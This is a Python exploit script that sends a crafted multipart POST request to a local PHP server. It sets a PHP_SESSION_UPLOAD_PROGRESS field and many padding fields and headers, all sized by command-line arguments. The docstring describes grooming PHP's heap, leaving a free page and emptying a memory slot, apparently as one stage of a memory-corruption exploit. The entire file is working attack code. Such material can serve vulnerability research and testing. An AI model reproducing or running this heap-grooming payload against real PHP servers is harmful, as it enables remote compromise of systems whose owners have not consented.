#!/usr/bin/env python3
"""A: N128/V padding + file part with NH big headers (HL) to leave ~1 free
page, plus NS small headers (15B values -> 40B bin) to empty slot4.
usage: send_a_mixhdr.py N128 V NH HL NS
"""
import socket,sys
N128=int(sys.argv[1]); V=int(sys.argv[2]); NH=int(sys.argv[3]); HL=int(sys.argv[4]); NS=int(sys.argv[5]); N=997
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N):
    ln=103 if i<N128 else V
    parts.append({'name':'f%04d'%i,'data':b'A'*ln})
head=b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
for i in range(NH):
    head += b'X-Pad-%04d: '%i + b'H'*HL + b'\r\n'
for i in range(NS):
    head += b'X-Sml-%04d: '%i + b's'*15 + b'\r\n'
head += b'Content-Type: application/octet-stream\r\n\r\n'
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'\r\n'+head+b'A'*64+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
